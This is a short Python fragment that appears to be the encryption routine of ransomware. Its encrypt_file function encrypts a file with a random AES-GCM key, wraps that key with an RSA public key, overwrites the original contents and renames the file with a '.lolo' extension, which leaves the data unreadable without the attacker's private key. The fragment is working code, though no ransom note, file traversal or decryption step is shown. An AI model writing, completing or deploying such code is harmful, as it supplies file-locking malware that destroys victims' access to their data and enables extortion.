import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def encrypt_file(file_path, public_key):
    # Encrypt file using RSA public key and AES-GCM, then add '.lolo' extension
    symmetric_key = os.urandom(32)  # 256-bit AES key
    iv = os.urandom(16)  # 128-bit IV

    with open(file_path, 'rb') as file:
        plaintext = file.read()

    cipher = Cipher(algorithms.AES(symmetric_key), modes.GCM(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    tag = encryptor.tag

    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )

    with open(file_path, 'wb') as file:
        file.write(encrypted_symmetric_key)
        file.write(iv)
        file.write(tag)
        file.write(ciphertext)
    
    os.rename(f'{file_path}',f'{file_path}.lolo')